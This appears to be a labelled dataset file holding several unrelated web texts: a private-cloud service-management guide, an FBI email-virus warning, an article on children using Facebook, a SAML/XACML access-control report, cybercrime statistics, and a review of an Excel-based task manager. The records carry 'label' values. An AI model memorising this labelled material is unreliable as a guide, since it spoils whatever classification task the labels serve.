past and current states and future-state forecasts, and be easily available to those who need it. Mature Service Asset and Configuration Management processes are necessary for achieving predictability.\nA virtualized infrastructure adds complexity to the management of Configuration Items (CIs) due to the transient nature of the relationship between guests and hosts in the infrastructure. How is the relationship between CIs maintained in an environment that is potentially changing very frequently?\nA service comprises software, platform, and infrastructure layers. Each layer provides a level of abstraction that is dependent on the layer beneath it. This abstraction hides the implementation and composition details of the layer. Access to the layer is provided through an interface and as long as the fabric is available, the actual physical location of a hosted VM is irrelevant. To provide Infrastructure as a Service (IaaS), the configuration and relationship of the components within the fabric must be understood, whereas the details of the configuration within the VMs hosted by the fabric are irrelevant.\nThe Configuration Management System (CMS) will need to be partitioned, at a minimum, into physical and logical CI layers. Two Configuration Management Databases (CMDBs) might be used; one to manage the physical CIs of the fabric (facilities, network, storage, hardware, and hypervisor) and the other to manage the logical CIs (everything else). The CMS can be further partitioned by layer, with separate management of the infrastructure, platform, and software layers. The benefits and trade-offs of each approach are summarized below.\nCMS Partitioned by Layer\nCMS Partitioned into Physical and Logical\nTable 2: Configuration Management System Options\nPartitioning logical and physical CI information allows for greater stability within the CMS, because CIs will need to be changed less frequently. This means less effort will need to be expended to accurately maintain the information. During normal operations, mapping a VM to its physical host is irrelevant. If historical records of a VM’s location are needed, (for example, for auditing or Root Cause Analysis) they can be traced through change logs.\nThe physical or fabric CMDB will need to include a mapping of fault domains, upgrade domains, and Live Migration domains. The relationship of these patterns to the infrastructure CIs will provide critical information to the Fabric Management System.\nThe Release and Deployment Management processes are responsible for making sure that approved changes to a service can be built, tested, and deployed to meet specifications with minimal disruption to the service and production environment. Where Change Management is based on the approval mechanism (determining what will be changed and why), Release and Deployment Management will determine how those changes will be implemented.\nThe primary focus of Release and Deployment Management is to protect the production environment. The less variation is found in the environment, the greater the level of predictability – and, therefore, the lower the risk of causing harm when new elements are introduced. The concept of homogenization of physical infrastructure is derived from this predictability principle. If the physical infrastructure is completely homogenized, there is much greater predictability in the release and deployment process.\nWhile complete homogenization is the ideal, it may not be achievable in the real world. Homogenization is a continuum. The closer an environment gets to complete homogeneity, the more predictable it becomes and the fewer the risks. Full homogeneity means not only that identical hardware models are used, but all hardware configuration is identical as well. When complete hardware homogeneity is not feasible, strive for configuration homogeneity wherever possible.\nFigure 2: Homogenization Continuum\nThe Scale Unit concept drives predictability in Capacity Planning and agility in the release and deployment of physical infrastructure. The hardware specifications and configurations have been pre-defined and tested, allowing for a more rapid deployment cycle than in a traditional data center. Similarly, known quantities of resources are added to the data center when the Capacity Plan is triggered. However, when the Scale Unit itself must change (for example, when a vendor retires a hardware model), a new risk is introduced to the private cloud.\nThere will likely be a period where both n and n-1 versions of the Scale Unit exist in the infrastructure, but steps can be taken to minimize the risk this creates. Work with hardware vendors to understand the life cycle of their products and coordinate changes from multiple vendors to minimize iterations of the Scale Unit change. Also, upgrading to the new version of the Scale Unit should take place one Fault Domain at a time wherever possible. This will make sure that if an incident occurs with the new version, it can be isolated to a single Fault Domain.\nHomogenization of the physical infrastructure means consistency and predictability for the VMs regardless of which physical host they reside on. This concept can be extended beyond the production environment. The fabric can be partitioned into development, test, and pre-production environments as well. Eliminating variability between environments enables developers to more easily optimize applications for a private cloud and gives testers more confidence that the results reflect the realities of production, which in turn should greatly improve testing efficiency.\nThe virtualized infrastructure enables workloads to be transferred more easily between environments. All VMs should be built from a common set of component templates housed in a library, which is used across all environments. This shared library includes templates for all components approved for production, such as VM images, the gold OS image, server role templates, and platform templates. These component templates are downloaded from the shared library and become the building blocks of the development environment. From development, these components are packaged together to create a test candidate package (in the form of a virtual hard disk (VHD) that is uploaded to the library. This test candidate package can then be deployed by booting the VHD in the test environment. When testing is complete, the package can again be uploaded to the library as a release candidate package – for deployment into the pre-production environment, and ultimately into the production environment.\nSince workloads are deployed by booting a VM from a VHD, the Release Management process occurs very quickly through the transfer of VHD packages to different environments. This also allows for rapid rollback should the deployment fail; the current release can be deleted and the VM can be booted off the previous VHD.\nVirtualization and the use of standard VM templates allow us to rethink software updates and patch management. As there is minimal variation in the production environment and all services in production are built with a common set of component templates, patches need not be applied in production. Instead, they should be applied to the templates in the shared library. Any services in production using that template will require a new version release. The release package is then rebuilt, tested, and redeployed, as shown below.\nFigure 3: The Release Process\nThis may seem counter-intuitive for a critical patch scenario, such as when an exploitable vulnerability is exposed. But with virtualization technologies and automated test scripts, a new version of a service can be built, tested, and deployed quite rapidly.\nVariation can also be reduced through standardized, automated test scenarios. While not every test scenario can or should be automated, tests that are automated will improve predictability and facilitate more rapid test and deployment timelines. Test scenarios that are common for all applications, or the ones that might be shared by certain application patterns, are key candidates for automation. These automated test scripts may be required for all release candidates prior to deployment and would make sure further reduction in variation in the production environment.\nKnowledge Management is the process of gathering, analyzing, storing, and sharing knowledge and information within an organization. The goal of Knowledge Management is to make sure that the right people have access to the information they need to maintain a private cloud. As operational knowledge expands and matures, the ability to intelligently automate operational tasks improves, providing for an increasingly dynamic environment.\nAn immature approach to Knowledge Management costs organizations in terms of slower, less-efficient problem solving. Every problem or new situation that arises becomes a crisis that must be solved. A few people may have the prior experience to resolve the problem quickly and calmly, but their knowledge is not shared. Immature knowledge management creates greater stress for the operations staff and usually results in user dissatisfaction with frequent and lengthy unexpected outages. Mature Knowledge Management processes are necessary for achieving a service provider’s approach to delivering infrastructure. Past knowledge and experience is documented, communicated, and readily available when needed. Operating teams are no longer crisis-driven as service-impacting events grow less frequent and are quickly resolves when they do occur.\nWhen designing a private cloud, development of the Health Model will drive much of the information needed for Knowledge Management. The Health Model defines the ideal states for each infrastructure component and the daily, weekly, monthly, and as-needed tasks required to maintain this state. The Health Model also defines unhealthy states for each infrastructure component and actions to be taken to restore their health. This information will form the foundation of the Knowledge Management database.\nAligning the Health Model with alerts allows these alerts to contain links to the Knowledge Management database describing the specific steps to be taken in response to the alert. This will help drive predictability as a consistent, proven set of actions will be taken in response to each alert.\nThe final step toward achieving a private cloud is the automation of responses to each alert as defined in the Knowledge Management database. Once these responses are proven successful, they should be automated to the fullest extent possible. It is important to note, though, that automating responses to alerts does not make them invisible and forgotten. Even when alerts generate a fully automated response they must be captured in the Service Management system. If the alert indicates the need for a change, the change record should be logged. Similarly, if the alert is in response to an incident, an incident record should be created. These automated workflows must be reviewed regularly by Operations staff to make sure the automated action achieves the expected result. Finally, as the environment changes over time, or as new knowledge is gained, the Knowledge Management database must be updated along with the automated workflows that are based on that knowledge.\nThe goal of Incident Management is to resolve events that are impacting, or threaten to impact, services as quickly as possible with minimal disruption. The goal of Problem Management is to identify and resolve root causes of incidents that have occurred as well as identify and prevent or minimize the impact of incidents that may occur.\nPinpointing the root cause of an incident can become more challenging when workloads are abstracted from the infrastructure and their physical location changes frequently. Additionally, incident response teams may be unfamiliar with virtualization technologies (at least initially) which could also lead to delays in incident resolution. Finally, applications may have neither a robust Health Model nor expose all of the health information required for a proactive response. All of this may lead to an increase in reactive (user initiated) incidents which will likely increase the Mean-Time-to-Restore-Service (MTRS) and customer dissatisfaction.\nThis may seem to go against the resiliency principle, but note that virtualization alone will not achieve the desired resiliency unless accompanied by highly mature IT Service Management (ITSM) maturity and a robust automated health monitoring system.\nThe drive for resiliency requires a different approach to troubleshooting incidents. Extensive troubleshooting of incidents in production negatively impacts resiliency. Therefore, if an incident cannot be quickly resolved, the service can be rolled back to the previous version, as described under Release and Deployment. Further troubleshooting can be done in a test environment without impacting the production environment. Troubleshooting in the production environment may be limited to moving the service to different hosts (ruling out infrastructure as the cause) and rebooting the VMs. If these steps do not resolve the issue, the rollback scenario could be initiated.\nMinimizing human involvement in incident management is critical for achieving resiliency. The troubleshooting scenarios described earlier could be automated, which will allow for identification and possible resolution of the root much more quickly than non-automated processes. But automation may mask the root cause of the incident. Careful consideration should be given to determining which troubleshooting steps should be automated and which require human analysis.\nHuman Analysis of Troubleshooting\nIf a compute resource fails, it is no longer necessary to treat the failure as an incident that must be fixed immediately. It may be more efficient and cost effective to treat the failure as part of the decay of the Resource Pool. Rather than treat a failed server as an incident that requires immediate resolution, treat it as a natural candidate for replacement on a regular maintenance schedule, or when the Resource Pool reaches a certain threshold of decay. Each organization must balance cost, efficiency, and risk as it determines an acceptable decay threshold – and choose among these courses of action:\nThe benefits and trade-off of each of the options are listed below:\nOption 4 is the least desirable, as it does not take advantage of the resiliency and cost reduction benefits of a private cloud. A well-planned Resource Pool and Reserve Capacity strategy will account for Resource Decay.\nOption 1 is the most recommended approach. A predictable maintenance schedule allows for better procurement planning and can help avoid conflicts with other maintenance activities, such as software upgrades. Again, a well-planned Resource Pool and Reserve Capacity strategy will account for Resource Decay and minimize the risk of exceeding critical thresholds before the scheduled maintenance.\nOption 3 will likely be the only option for self-contained Scale Unit scenarios, as the container must be replaced as a single Scale Unit when the decay threshold is reached.\nThe goal of Request Fulfillment is to manage requests for service from users. Users should have a clear understanding of the process they need to initiate to request service and IT should have a consistent approach for managing these requests.\nMuch like any service provider, IT should clearly define the types of requests available to users in the service catalog. The service catalog should include an SLA on when the request will be completed, as well as the cost of fulfilling the request, if any.\nThe types of requests available and their associated costs should reflect the actual cost of completing the request and this cost should be easily understood. For example, if a user requests an additional VM, its daily cost should be noted on the request form, which should also be exposed to the organization or person responsible for paying the bill.\nIt is relatively easy to see the need for adding resources, but more difficult to see when a resource is no longer needed. A process for identifying and removing unused VMs should be put into place. There are a number of strategies to do this, depending on the needs of a given organization, such as:\nThe benefits and trade-offs of each of these approaches are detailed below:\nOption 4 affords the greatest flexibility, while still working to minimize server sprawl. When a user requests a VM, they have the option of setting an expiration date with no reminder (for example, if they know they will only be using the workload for one week). They could set an expiration deadline with a reminder (for example, a reminder that the VM will expire after 90 days unless they wish to renew). Lastly, the user may request no expiration date if they expect the workload will always be needed. If the last option is chosen, it is likely that underutilized VMs will still be monitored and owners notified.\nFinally, self-provisioning should be considered, if appropriate, when evaluating request fulfillment options to drive towards minimal human involvement. Self-provisioning allows great agility and user empowerment, but it can also introduce risks depending on the nature of the environment in which these VMs are introduced.\nFor an enterprise organization, the risk of bypassing formal build, stabilize, and deploy processes may or may not outweigh the agility benefits gained from the self-provisioning option. Without strong governance to make sure each VM has an end-of-life strategy, the fabric may become congested with VM server sprawl. The pros and cons of self-provisioning options are listed in the next diagram:\nThe primary decision point for determining whether to use self-provisioning is the nature of the environment. Allowing developers to self-provision into the development environment greatly facilitates agile development, and allows the enterprise to maintain release management controls as these workloads are moved out of development and into test and production environments.\nA user-led community environment isolated from enterprise mission-critical applications may also be a good candidate for self-provisioning. As long as user actions are isolated and cannot impact mission critical applications, the agility and user empowerment may justify the risk of giving up control of release management. Again, it is essential that in such a scenario, expiration timers are included to prevent server sprawl.\nThe goal of Access Management is to make sure authorized users have access to the services they need while preventing access by unauthorized users. Access Management is the implementation of security policies defined by Information Security Management at the Service Delivery Layer.\nMaintaining access for authorized users is critical for achieving the perception of continuous availability. Besides allowing access, Access Management defines users who are allowed to use, configure, or administer objects in the Management Layer. From a provider’s perspective, it answers questions like:\nFrom a consumer’s perspective, it answers questions such as:\nAccess Management is implemented at several levels and can include physical barriers to systems such as requiring access smartcards at the data center, or virtual barriers such as network and Virtual Local Area Network (VLAN) separation, firewalling, and access to storage and applications.\nTaking a service provider’s approach to Access Management will also make sure that resource segmentation and multi-tenancy is addressed.\nResource Pools may need to be segmented to address security concerns around confidentiality, integrity, and availability. Some tenants may not wish to share infrastructure resources to keep their environment isolated from others. Access Management of shared infrastructure requires logical access control mechanisms such as encryption, access control rights, user groupings, and permissions. Dedicated infrastructure also relies on physical access control mechanisms, where infrastructure is not physically connected, but is effectively isolated through a firewall or other mechanisms.\nThe goal of systems administration is to make sure that the daily, weekly, monthly, and as-needed tasks required to keep a system healthy are being performed.\nRegularly performing ongoing systems administration tasks is critical for achieving predictability. As the organization matures and the Knowledge Management database becomes more robust and increasingly automated, systems administration tasks is no longer part of the job role function. It is important to keep this in mind as an organization moves to a private cloud. Staff once responsible for systems administration should refocus on automation and scripting skills – and on monitoring the fabric to identify patterns that indicate possibilities for ongoing improvement of existing automated workflows.", "label": 1}
{"text": "The Federal Bureau of Investigation (FBI) has warned computer users that e-mails from scam artists pretending to be FBI agents are spreading a computer virus.\nThe e-mails tell recipients that the FBI's Internet Fraud Complaint Center has monitored their Internet use and found they have accessed illegal Web sites. The e-mails then direct recipients to open an attachment and complete a questionnaire.\nThis is a bogus message. The attachment contains a computer virus. DO NOT OPEN OR LAUNCH THE ATTACHMENT. You should DELETE the e-mail immediately.\nAs a general rule, if you receive an e-mail that you are not expecting, even if you know the sender, DO NOT OPEN IT OR LAUNCH the attachment and DO NOT FORWARD the message. If you are not sure, contact the sender to verify the e-mail. Otherwise, DELETE the e-mail.\nThe Information and Network Security team has put in place appropriate protections to prevent the virus from spreading. Current anti-virus definitions detect and block this virus.", "label": 1}
{"text": "Even though Facebook requires users to be at least 13 years old, there are 7.5. million users under that age, most of them not yet 10, according to projections from a \"State of the Net\" survey conducted by Consumer Reports.\nThe survey, published in the June issue of Consumer Reports, also found that the accounts of these minors were largely unsupervised by their parents, exposing them to online predators and bullies.\n\"Despite Facebook's age requirements, many kids are using the site who shouldn't be,\" Jeff Fox, technology editor for Consumer Reports, said in a release. \"What's even more troubling was the finding from our survey that indicated that a majority of parents of kids 10 and under seemed largely unconcerned by their children's use of the site.\"\nIndeed, the survey found that one million children were exposed to online bullying through Facebook in the past year. Use of the site also exposed more than five million U.S. households to virus infections, identity theft and other types of abuse.\nTo guard against abuse, Consumer Reports recommends parents carefully monitor their children's Facebook accounts, joining their children's circle of friends on the site and either deleting a pre-teen's account or asking Facebook to do so by filling out its \"report an underage child\" form.\nAlso, use the site's privacy controls. Roughly one in five adult users said they hadn't, making them more vulnerable to threats. Consumer Reports advices users to set everything you can so that it can only be accessed by people on your friends list. Among the magazine's other recommendations: turn off instant personalization and use apps with caution, both of which can help keep personal information about you from floating around online.\nIn April, Facebook compared web safety for kids to crossing the street.\n\"We agree with safety experts that communication between parents/guardians and kids about their use of the Internet is vital,\" the company said. \"Just as parents are always teaching and reminding kids how to cross the road safely, talking about internet safety should be just as important a lesson to learn.\"\nPerhaps kids who aren't yet 13 need to be on Facebook in today's world, but if that's true, then their parents really, really need to make sure they know what they're doing online.\nOr perhaps kids shouldn't be allowed to use Facebook until they reach the site's minimum age.\nWhat do you think?", "label": 1}
{"text": "|Yoon Jae Kim, yj1dreamer AT gmail.com (A project report written under the guidance of Prof. Raj Jain)||Download|\nService Oriented Architecture (SOA) is a design pattern which is composed of loosely coupled, discoverable, reusable, inter-operable platform agnostic services in which each of these services follow a well defined standard. Each of these services can be bound or unbound at any time and as needed. [Jamil08]However, as defined, SOA has a loosely-coupled feature, which makes SOA open to the challenges of security. It means that SOA must meet several requirements. The main requirements are as follows[Candolin07]: service discovery, service authentication, user authentication, access control, confidentiality, integrity, availability, and privacy. To ensure security in a loosely-coupled SOA environment, the open standards communities that created Web services developed a number of security standards for Web services which is one of the most active and widely adopted implementation of SOA. Figure 1 depicts a notional reference model for Web services security standards. This reference model maps the different standards to the different functional layers of a typical Web service implementation.\nAs described above, in the Web Services Security Stack the Security Assertion Markup Language (SAML) and the eXtensible Access Control Markup Language (XACML) are the standard for access control which means that when the service is requested by a user the service must enforce the specified security policy related to access control. We focus on access control in the Web Services security and represent what SAML and XACML are, how they work and where they are able to be applied together.\nSAML, created by the Security Services Technical Committee of the Organization for the Advancement of Structured Information Standards (OASIS), is a an XML-based framework for communicating user authentication, entitlement, and attribute information. As its name suggests, SAML allows business entities to make assertions regarding the identity, attributes, and entitlements of a subject (an entity that is often a human user) to other entities, such as a partner company or another enterprise application. [Madsen05] SAML is a flexible and extensible protocol designed to be used - and customized if necessary - by other standards.\nWeb Single Sign-On\nIn web SSO, a user authenticates to one web site and then, without additional authentication, is able to access some personalized or customized resources at another site. SAML enables web SSO through the communication of an authentication assertion from the first site to the second which, if confident of the origin of the assertion, can choose to log in the user as if they had authenticated directly. A principal authenticates at the identity provider and is subsequently appropriately recognized (and given corresponding access/service) at the service provider.[Google]\nFor example, Google made SAML Single Sign-On (SSO) Service for Google Apps. And Google Apps provides a SAML-based Single Sign-On (SSO) service that offers partner companies with full control over the authorization and authentication of hosted user accounts that can access web-based applications like Gmail or Google Calendar. As the service provider Google offers services as Gmail and Start Pages and partner companies control account information as identity provider.\nSimilar to the Web SSO scenario, the attribute-based authorization model has one web site communicating identity information about a subject to another web site in support of some transaction.\nHowever, the identity information may be some characteristic of the subject (such as a person's role in a B2B scenario) rather than, or in addition to, information about when and how the person was authenticated. The attribute-based authorization model is important when the individual's particular identity is either not important, should not be shared for privacy reasons, or is insufficient on its own.\nSecuring Web Services\nSAML assertions can be used within SOAP messages in order to convey security and identity information between actors in web service interactions. The SAML Token Profile produced by the OASIS Web Services Security (WSS) TC specifies how SAML assertions should be used for this purpose with the WS-Security framework. The Liberty Alliance's Identity Web Service Framework (ID-WSF) builds on these specifications to use SAML assertions for enabling secure and privacy-respecting access to web services.\nWS-Trust, one component of the private WS-* framework initiative, proposes protocols for the exchange and validation of security tokens used as described within WS-Security. SAML assertions are one such supported security token format.\nFigure 3 illustrates these actors and information flow. As can be seen in the figure, the PAP writes Polices and PolicySets and makes them available to the PDP. These Policies or PolicySets shows the complete policy for a particular target. The PEP is the component where the request is received when access requester wants to take some action on a resource and make the request. In this part, the attributes in the request may be in the format of the application environment (e.g., SAML, etc.). The PEP sends the request to the Context Handler. Context Handler maps the request and attributes to the XACML Request context and sends the request to the PDP. While evaluating the request, the PDP needs some attributes and sends the attribute queries to the Context Handler. The Context Handler collects these attributes by the help of the PIP from the resources, subjects, and the environment. After evaluation, the PDP sends the XACML Response to the Context Handler and the Context Handler translates the Response context to the native response format of the application environment and sends it to PEP. The PEP fulfills the obligations if they exist and applies the authorization decision that PDP concludes.[Periorellis07]\nA Request element contains four components as Subject, Resource, Action, and Environment. One request element has only one collection of resource and action attributes, and at most one collection of environment attributes. But there may be multiple collections of subject attributes. Subject attribute contains subject's details such as name, e-mail, role and so on. Resource attribute details the resource for which access is requested and action attribute specifies the requested action to be performed on resource such as read or wire. Also, Environment attribute is optional and contains attributes of environment.\nA Response element represents the authorization decision information made by PDP. It contains one or more Result attributes. Each result includes a Decision such as Permit, Deny, NotApplicable, or Indeterminate, some Status information which gives the errors occurred and their descriptions while evaluating the request and optionally one or more Obligations which specifies tasks in the PolicySet and Policy elements in the policy description which should be performed before granting or denying access.\nA Rule element defines the target elements to which the rule is applied and details conditions to apply the rule and has three components such as target, effect, and condition. A target element specifies the resources, subjects, actions and the environment to which the rule is applied. A condition element shows the conditions to apply the rule and a effect is the consequence of the rule as either permit or deny.\nA policy is the set of rules which are combined with some algorithms. These algorithms are called Rule-combining algorithms. For instance \"Permit Override\" algorithm allows the policy to evaluate to \"Permit\" if any rule in the policy evaluates to \"Permit\". A policy also contains target elements which shows the subjects, resources, actions, environment that policy is applied.\nA PolicySet consists of Policies and PolicySets combined with policy-combined algorithm. It has also target like a Policy.\nThe XACML context shows how flexible and suitable the XACML is for various application. This feature makes it possible that XACML is applied to access control system with SAML. Section 4 shows the more detailed.\nSAML is one standard suitable for providing the assertion and protocol mechanisms and specifies schemas for carrying the security and authorization related information and have the bindings to basic transportation mechanisms. Therefore, OASIS publishes a SAML profile for the XACML (OASIS, 2005)[Anderson05] to carry the XACML messages between the XACML actors. This profile defines the usage of SAML 2.0 to protect, store, transport, request and respond with XACML instances and other information. It contains largely four categories.\nFirst, this profile specifies how to use SAML Attributes in an XACML system. This category contains three standard SAML elements such as SAML Attribute, SAML AttributeStatement and SAML Assertion, two standard SAML protocol such as SAML AttributeQuery and SAML Response, and one new SAML extension element, XACMLAssertion. In an XACML system, SAML Attribute may be used to store and to transmit attribute values and must be transformed into an XACML Attribute before used in an XACML Request Context. Also SAML AttributeStatement may be used to hold SAML Attribute instances. A SAML Assertion may be used to hold SAML AttributeStatement instances in an XACML system, either in an Attribute Repository or in a SAML Response to a SAML AttributeQuery. To transform a SAML Attribute into an XACML Attribute the SAML Assertion includes information that is required and a SAML Assertion or an XACMLAssertion instance contains a SAML Attribute. An XACMLAssertion is an alternative to the SAML Assertion and allows inclusion of XACML Statement instances and inclusion of other XACMLAssertion instance as advice. An XACML PDP or PEP use SAML AttributeQuery to request SAML Attribute instances from an Attribute Authority for use in an XACML Request Context and in response to it SAML Response shall be used to return SAML Attribute instances.\nSecond, this profile represent the use of SAML for use in requesting, responding with, storing, and transmitting authorization decisions in an XACML system. This category contains XACMLAuthzDecisionStatement, XACMLAssertion, XACMLAuthzDecisionQuery, and XACMLResponse. In this profile, XACMLAuthzDecisionStatement and XACMLAssertion are new SAML extension elements and the others are new SAML extension protocol elements. In an XACML system, XACMLAuthzDecisionSatement may be used to contain XACML authorization decisions for storage or transmission and XACMLAssertion may be used to contain XACMLAuthzDecisionStatement instances for storage or transmission. Also a PEP may use XACMLAuthzDecisionQuery to request an authorization decision from an XACML PDP and an XACML PDP may use XACMLResponse to return authorization decisions in response to an XACMLAuthzDecisionQuery.\nThen, this profile shows the use of SAML for use in requesting, responding with, storing and transmitting XACML policies. This category includes four new SAML extensions; XACMLPolicyStatement, XACMLAssertion, XACMLPolicyQuery and XACMLResponse. In an XACML system, XACMLPolicyStatement may hold XACML policies for storage or transmission and XACMLAssertion may hold XACMLPolicySatement instances for storage or transmission. And a PDP or other application uses XACMLPolicyQuery to request XACML from a PAP. Also PAP uses XACMLResponse to return policies in response to an XACMLPolicyQuery.\nFinally, this profile details the use of XACMLAssertion instances as advice in other Assertion. This category consists of XACML Advice, which is a new SAML extension element in this profile that may be used for including XACMLAssertion instances as advice in another XACMLAssertion, and XACMLAssertion which is a new SAML extension element that may be used to hold on XACMLAdvice instance along with SAML Statement or XACML extension Statement instance.\nFigure 5 describes the XACML use model and the messages that can be used to communicate between the various components. Statements are carried in SAML or XACML Assertions, and Assertions are carried in SAML or XACML Responses. Not all components or messages will be used in every implementation. Next subsection shows the practical example of this model.\nThe steps of communication between Portal and Web services are described in detail as follows:\nFocusing on access control we represent SAML and XACML which are developed by OASIS. SAML is an XML-based framework for exchanging authentication and authorization data. Because SAML has much strength such as platform neutrality, loose coupling of directories, improved online experience for end user, reduced administrative costs for service providers and risk transference. Also SAML is being applied in Web Single Sign-On, Attribute-Based Authorization, and Securing Web Services.\nXACML defines XML files which contains access control policy and access control decision request/ response. Policy Decision Point (PDP) looks at the request from Policy Enforcement Point (PEP) and finds some policy applying to the request from Policy Administration Point (PAP) and returns the response about whether access should be granted to PEP.\nXACML defines the content of Request/Response messages but does not define protocols or transport mechanisms, which SAML provides by defining schemas for use in requesting and responding with various types of security assertions. This SAML/XACML based access control is a very powerful and practical solution for dynamic and large-scale application domain because it is easier to change and maintain policies. So it can extend the authentication and authorization mechanism within a portal to external Web services.\n|[Candolin07]||Candolin, Catharina, \"A Security Framework for Service Oriented Architectures\", Military Communications Conference, 2007. MILCOM 2007. IEEE, 29-31 Oct. 2007, pp.1-6 http://ieeexplore.ieee.org/xpl/freeabs_all.jsp?arnumber=4455332|\n|[Singhal07]||Singhal , Anoop, \"Web Services Security: Challenges and Techniques\" policy, Eighth IEEE International Workshop on Policies for Distributed Systems and Networks (POLICY'07), 2007, pp.282 http://www2.computer.org/portal/web/csdl/doi/10.1109/POLICY.2007.50|\n|[Madsen05]||Madsen, Paul, et al., \"SAML V2.0 Executive Overview\", OASIS Committee Draft, 12 April 2005 http://www.oasis-open.org/committees/download.php/13525/sstc-saml-exec-overview-2.0-cd-01-2col.pdf|\n|[Ragouzis08]||Ragouzis, Nick, et al., \"Security Assertion Markup Language (SAML) V2.0 Technical Overview\", Committee Draft 02, 25, March 2008, http://www.oasis-open.org/committees/download.php/27819/sstc-saml-tech-overview-2.0-cd-02.pdf|\n|[Sun]||\"Sun's XACML Implementation\", July 2004, http://sunxacml.sourceforge.net/guide.html|\n|[Moses05]||Moses, Tim, et al., \"eXtensible Access Control Markup Language(XACML) Version 2.0\", OASIS Standard, 1 Feb 2005, http://docs.oasis-open.org/xacml/2.0/access_control-xacml-2.0-core-spec-os.pdf|\n|[Periorellis07]||Periorellis,Panos , \"Securing Web Services: Practical Usage of Standards and Specifications\", Idea Group Inc(IGI), 2007. http://books.google.com/books?id=zX2N7fWTJOUC|\n|[YIN07]||Yin, Hao, et al., \"A SAML/XACML Based Access Control between Portal and Web Services\", Data, Privacy, and E-Commerce, 2007. ISDPE 2007. The First International Symposium on, Nov. 2007, pp 356-360 http://ieeexplore.ieee.org/xpl/freeabs_all.jsp?arnumber=4402710|\n|[Anderson05]||Anderson, Anne, et al., \"SAML 2.0 profile of XACML v2.0\", OASIS Standard, 1 Feb 2005 http://docs.oasis-open.org/xacml/2.0/access_control-xacml-2.0-saml-profile-spec-os.pdf|\n|[Jamil08]||Jamil, Ejaz, et al., \"What really is SOA. A comparison with Cloud Computing, Web 2.0, SaaS, WOA, Web Services, PassS and others\", SOALIB, 12 Dec 2008. http://soalib.com/docs/whitepaper/SoalibWhitePaper_SOAJargon.pdf|\n|[Google]||SAML Single Sign-On (SSO) Service for Google Apps, http://code.google.com/apis/apps/sso/saml_reference_implementation.html|\n|CORBA||Common Object Request Broker Architecture|\n|DCE||Distributed Computing Environment|\n|GSA||General Services Administration|\n|IDP||General Services Administration|\n|J2SE||Java Platform Standard Edition|\n|ID-WSF||Identity Web Services Framework|\n|LDAP||Lightweight Directory Access Protocol|\n|OASIS||the Organization for the Advancement of Structured Information Standards|\n|PAP||Policy Administration Point|\n|PDP||Policy Decision Point|\n|PEP||Policy Enforcement Point|\n|PIP||Point Information Point|\n|SAML||Security Assertion Markup Language|\n|SOA||Service Oriented Architecture|\n|SOAP||Simple Object Access Protocol|\n|SSL||Secure Sockets Layer|\n|TLS||Transport Layer Security|\n|WSS||Web Security Service|\n|XACML||eXtensible Access Control Markup Language|\n|XKMS||XML Key Management Specification|\n|XML||eXtensible Markup Language|\n|XSLT||eXtensible Markup Language|\nLast Modified: April, 19, 2009\nThis and other papers on latest advances in network security are available on line at http://www1.cse .wustl.edu/~jain/cse571-09/index.html\nBack to Raj Jain's Home Page", "label": 1}
{"text": "Cybercrime costs $388 billion dollars in annual losses globally and it affected almost 7 in 10 adults last year.\nThis week Norton is released the results of the Norton Cybercrime Report 2011, a study on the impact of cybercrime that included a survey of over 12,000 adults in 24 countries. This provides an important and accurate picture of the scope of cybercrime globally and the results are shocking! Every day of the past year, over 1 million online adults in 24 countries experienced cybercrime. This can also be broken down to 50,000 victims per hour, 820 victims per minute, or 14 victims every second. In just the last 12 months 44% of people have been a victim of cybercrime while only 15% have been a victim of physical crime in the same period.\nI regularly meet with law enforcement who are fighting cybercrime. The above statistics clearly illustrate the biggest challenge faced by law enforcement—the enormous scope of the problem. With so many victims in many different countries, police can successfully stop one cybercriminal but still be left with thousands of more cases. The police do a great job trying to stop cybercrime but the problem requires significantly more resources than are currently being devoted to stop it.\nOnly 21% of people in the Norton study reported the cybercrime to law enforcement. This also creates a significant problem for police and prosecutors. Some prosecutors will only accept cases that exceed a certain amount of victims or high level of damages. US law allows federal prosecutors to combine multiple victims into a common case if the crime is linked. This is critical in many cybercrime cases where there may be a small number of victims who have lost a relatively small amount individually. However, failure to report cybercrime prevents law enforcement from effectively addressing the problem.\nFinally, the key message of this report is one of hope. Despite the really frightening statistics on the scale of cybercrime, cybercrime is still largely a preventable crime. Globally the three most common reported forms of cybercrime were viruses, online scams, and phishing attacks. All of these crimes are largely preventable by following good security practices and using updated security software. I have worked with crime victims in some capacity for over a decade now. Nobody wants to be a victim. The police are trying to help but it is an extremely rare cybercrime case in which a victim actually recovers their lost money . Time dealing with cybercrime is also lost forever. It is far better to use good security software and follow careful safety steps online that can greatly reduce the likelihood of becoming one of the 7 in 10 global cybercrime victims last year.", "label": 1}
{"text": "Nearly everybody with more than the minimum amount of computer knowledge will have used the built in Windows Task Manager, and know what an important tool it can sometimes be. Whenever a program crashes, hangs, consumes too many resources or just shouldn’t be there, often the quickest and easiest way to solve the problem is using Task Manager to forcefully close the program.\nThe problem with Task Manager is it’s such a vital troubleshooting component, malware often targets it and tries to block use of the Task Manager so the malicious process cannot be terminated. Some more sophisticated malware can even block third party task management software such as Process Explorer from running.\nIf you’re stuck and the default Task Manager has been blocked or you can’t run a third party task manager tool then things can become quite tricky. There is however, a rather interesting solution to get around this problem, which is to use a task manager tool built to run in a Microsoft Excel spreadsheet. Most people would expect a utility like this to be an executable .exe file, but this one is actually a standard Office 97 – 2003 Worksheet .xls file with some built in trickery.\nTaskManager.xls is a small (41KB) and simple task manager that has been created using the Visual Basic for Applications (VBA) programming language component built into Excel and other Office applications. While it doesn’t show you things like running services, performance graphs or network activity, it can list the currently running processes, and terminate, suspend or resume any of them, which is the most important part when dealing with malware.\nFor this to run you have to make sure Macro’s are enabled in Excel because their usage is disabled by default to protect against potential Macro viruses. If Macro’s are disabled for instance in Excel 2003, and you don’t get asked if you want to enable them for the current sheet, go to Tools -> Options -> Security -> Macro Security, and set the level to medium which will always ask to run a Macro in future.\nThere are only 2 buttons and a blank window in TaskManager.xls to start with. The List processes button will populate the window with a list of all running and active processes on your computer, and the Execute commands button will perform one of the three tasks available of terminate, suspend or resume a process. These are used by entering t, s or r into column A of the worksheet, then pressing the button.\nThe screenshot below shows that the MaliciousProcess.exe is to be suspended and Ransomware.exe terminated when the Execute commands button is pressed. Clicking the button will do just that, then press the List processes button again to update the list. Do note that like a traditional task manager tool, TaskManager.xls is unable to terminate protected processes. For example, nothing will happen if you try to terminate the Client Server Runtime Process (csrss.exe) from TaskManager.xls.\nTaskManager.xls is very useful but unfortunately it does have problems working in other Office suites. In Libre Office v4 clicking the List Processes button will prompt a runtime error, and Softmaker Office free version doesn’t support VBA. The free version of Kingsoft Office 